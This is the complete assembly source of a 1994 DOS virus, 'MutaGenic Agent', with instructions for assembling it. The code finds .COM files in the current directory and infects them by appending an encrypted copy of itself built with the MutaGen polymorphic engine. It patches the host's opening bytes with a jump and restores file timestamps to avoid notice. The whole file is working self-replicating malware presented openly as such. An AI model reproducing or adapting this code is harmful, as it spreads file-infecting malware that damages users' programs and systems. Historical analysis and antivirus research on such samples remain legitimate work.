﻿

; ========================================================================>
; MutaGenic Agent - MutaGen Test Virus 1
; by MnemoniX 1994
;
; This sample virus will infect one .COM file in the current directory
; upon run and encrypt itself MutaGenically.
; To assemble:
;   TASM mg1
;   TLINK /t mg1 mutagen
; ========================================================================>

ID              equ     'MG'            ; ID word
MAX_INFECTIONS  equ     2               ; infections per run

MGEN_SIZE       equ     1544            ; version 1.2

extrn   _MUTAGEN:near                   ; call MutaGen

code    segment byte    public  'code'
	org     100h
	assume  cs:code,ds:code,es:code,ss:code

start:
	db      0E9h,07h,00h            ; jmp virus_begin
	dw      ID

host:
	mov     ax,4C00h
	int     21h

virus_begin:
	call    $+3                     ; BP serves as pointer
	pop     bp
	sub     bp,offset $-1

	mov     byte ptr [bp+offset infect],0 ; clear infection flag

	mov     ah,2Fh                  ; get original DTA address
	int     21h                     ; and save it
	push    bx

	lea     dx,[bp+virus_end]       ; set our DTA to the end of the
	mov     ah,1Ah                  ; virus code
	int     21h

	call    infect_search           ; infection routine ...
	
	pop     dx                      ; ... and we're done
	mov     ah,1Ah
	int     21h

	mov     di,100h                 ; enter in original five bytes of host
	push    di                      ; save DI as host address
	lea     si,[bp+offset prog_len] ; get address of original host header
	mov     si,[si]                 ; found at end of host program
	add     si,100h
	movsb                           ; move five bytes
	movsw
	movsw

	ret                             ; and call host 

infect_search   proc    near

	mov     ah,4Eh                  ; search for first .COM file
	lea     dx,[bp+com_file]        ; in directory
	xor     cx,cx
	int     21h
	jnc     infect_file             ; none present, leave
	jmp     inf_complete

infect_file:
	mov     ax,3D02h                ; .COM file found, open
	lea     dx,[bp+virus_end+1Eh]
	int     21h

	mov     bx,ax                   ; file handle in BX
	mov     ax,5700h                ; get file date and time
	int     21h                     ; and save it
	push    cx
	push    dx
	
	lea     dx,[bp+orig_header]     ; now read in first five bytes
	mov     cx,5                    ; of the file
	mov     ah,3Fh
	int     21h

	mov     ax,4202h                ; no, infect this file
	call    move_pointer            ; (this call is to save bytes)
	
	cmp     ax,64000
	jae     infected                ; file is too big, skip it
	cmp     [bp+offset orig_header+3],ID
	je      infected                ; if previously infected, skip it

	lea     si,[bp+offset new_jump+1]
	
	push    [bp+offset prog_len]    ; save original program length
	mov     [bp+offset prog_len],ax ; store this program length

	add     ax,2
	mov     [si],ax

	lea     dx,[bp+offset orig_header] ; store first five bytes of file
	mov     cx,5                    ; at end of file
	mov     ah,40h
	int     21h

; MutaGen calling routine
	mov     dx,[si]                 ; MutaGen offset calculation
	add     dx,103h
	mov     cx,VIRUS_SIZE           ; write VIRUS_SIZE bytes
	lea     di,[bp+virus_end+80h]   ; store at end of virus
	lea     si,[bp+offset virus_begin]
	call    _MUTAGEN

	mov     ah,40h                  ; write virus to file
	int     21h

	pop     [bp+offset prog_len]    ; restore original program length

	mov     ax,4200h                ; lastly, add our new jump instruction
	call    move_pointer            ; to the beginning of the file

	lea     dx,[bp+offset new_jump]
	mov     cx,5                    ; write five bytes to file
	mov     ah,40h
	int     21h

	inc     byte ptr [bp+offset infect] ; set infection flag

infected:
	pop     dx                      ; restore time and date
	pop     cx
	mov     ax,5701h
	int     21h

	mov     ah,3Eh                  ; close file
	int     21h

	cmp     byte ptr [bp+offset infect],1  ; did an infection occur?
	je      inf_complete            ; yes, go

	mov     ah,4Fh                  ; find another file
	int     21h                     ; and repeat
	jc      inf_complete            ; none found, quit
	jmp     infect_file
inf_complete:
	ret

					
move_pointer:
	cwd
	xor     cx,cx
	int     21h
	ret

		endp

com_file        db      '*.COM',0       ; .COM file
orig_header     db      5 dup(0)        ; first three bytes of program
new_jump        db      0E9h,00,00      ; new jump instruction
		dw      ID              ; ID signature
prog_len        dw      5               ; length of host+5 for return
infect          db      0
sig             db      '[MutaGenic Agent I]',0

virus_end       equ     $ + MGEN_SIZE

VIRUS_SIZE      equ     virus_end - offset virus_begin

code    ends               
	end     start


